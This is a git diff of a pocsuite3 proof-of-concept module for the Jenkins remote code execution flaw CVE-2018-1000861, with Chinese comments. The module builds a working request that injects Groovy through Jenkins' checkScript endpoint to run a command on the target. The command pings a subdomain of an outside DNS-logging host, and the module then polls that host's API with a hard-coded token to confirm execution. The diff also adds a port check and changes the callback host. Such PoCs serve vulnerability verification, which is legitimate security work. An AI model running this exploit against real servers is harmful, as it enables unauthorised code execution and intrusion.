@@ -9,17 +9,20 @@ import threading
 import uuid
 import subprocess
 import os
-
+import traceback
+import socket
+# 将输入的url转换为ip:port，供socket使用
+from pocsuite3.lib.utils import url2ip
+from pocsuite3.api import logger
 from pocsuite3.api import requests as req
 from pocsuite3.api import register_poc
 from pocsuite3.api import Output, POCBase
 from pocsuite3.api import POC_CATEGORY, VUL_TYPE
 
-# 需要CVE-2017-1000353-1.1-SNAPSHOT-all.jar包
-# 
 
 '''
-CVE-2018-1000861
+CVE-2018-1000861 + CVE-2019-10030{29,30}
+https://github.com/gquere/pwn_jenkins
 https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861
 '''
 class Jenkins_RCE_2018_1000861_POC(POCBase):
@@ -31,7 +34,7 @@ class Jenkins_RCE_2018_1000861_POC(POCBase):
     vulDate = '2018-12-05'  # 漏洞公开的时间,不知道就写今天
     author = 'shadowsock5'  # PoC作者的大名
     createDate = '2019-02-24'  # 编写 PoC 的日期
-    updateDate = '2020-02-24'  # PoC 更新的时间,默认和编写时间一样
+    updateDate = '2020-04-09'  # PoC 更新的时间,默认和编写时间一样
     references = ['https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595']  # 漏洞地址来源,0day不用写
     name = 'Jenkins RCE CVE-2018-1000861'  # PoC 名称
     install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
@@ -39,46 +42,71 @@ class Jenkins_RCE_2018_1000861_POC(POCBase):
 
     
     # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
-    DOMAIN = 'wvg689.ceye.io'
-    TOKEN = '76dce59a986eab595838f7dc74903035'
+    DOMAIN = 'omvxwo.2w1.pw'
+    TOKEN = '476b83ccc233e92e96ff72b2bd08310f'
     BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
-    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)
+    CEYE_URL = 'http://admin.2w1.pw/api?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)
 
-    http_proxy  = "http://127.0.0.1:8087"
-    proxies = {"http": http_proxy, "https": http_proxy}
 
     def _verify(self):
         result={}
 
         vul_url = self.url
         target_url = vul_url
-        
-        #command = "'ping {0}.{1}'".format(self.BANNER, self.DOMAIN)
-        command = "touch /tmp/jenkins_{0}".format(self.BANNER)
+       
+        host, port = url2ip(vul_url, True)
+
+        logger.info("检查端口开放情况...")
+        # 端口都不开放就不浪费时间了
+        if not self.is_port_open(host, port):
+            logger.info("端口不开放! 退出!")
+            return
+
+        logger.info("端口开放... 继续") 
+ 
+        command = "ping {0}.{1}".format(self.BANNER, self.DOMAIN)
+        #command = "touch /tmp/jenkins_{0}".format(self.BANNER)
 
         payload_url = vul_url + '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript' + \
         '?sandbox=true&value=' + \
         'public class x %7b public x()%7b"{0}".execute()%7d%7d'.format(command)
         
         try:
-            req.get(payload_url, proxies=self.proxies)
+            req.get(payload_url, timeout=5)
         except Exception as e:
-            e.printStackTrace()
+            print(e)
+            traceback.print_stack()
         
         time.sleep(2) # 休眠2s等待ceye生成记录
         if self.test_dnslog(self.CEYE_URL):
             result['VerifyInfo'] = {}
             result['VerifyInfo']['URL'] = target_url
+            result['VerifyInfo']['Payload'] = payload_url
             return self.save_output(result)
         return self.save_output(result)
 
+
+    def is_port_open(self, p_host, p_port):
+        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sk.settimeout(2)
+        try:
+            sk.connect((p_host, p_port))
+            print('Server port is OK!')
+        except Exception as e:    # 碰到异常认为端口未开放，返回False
+            return False
+        
+        sk.close()
+        # 没问题就返回True
+        return True
+
+
     # 验证DNS已被解析，命令执行
     def test_dnslog(self, url):
-        resp = req.get(url)
+        resp = req.get(url, timeout=5)
         d = resp.json()
         try:
-            name = d['data'][0]['name']
-            if self.BANNER in name:
+            sub_domain = d['data'][0]['domain']
+            if self.BANNER in sub_domain:
                 return True
         except Exception:
             return False            
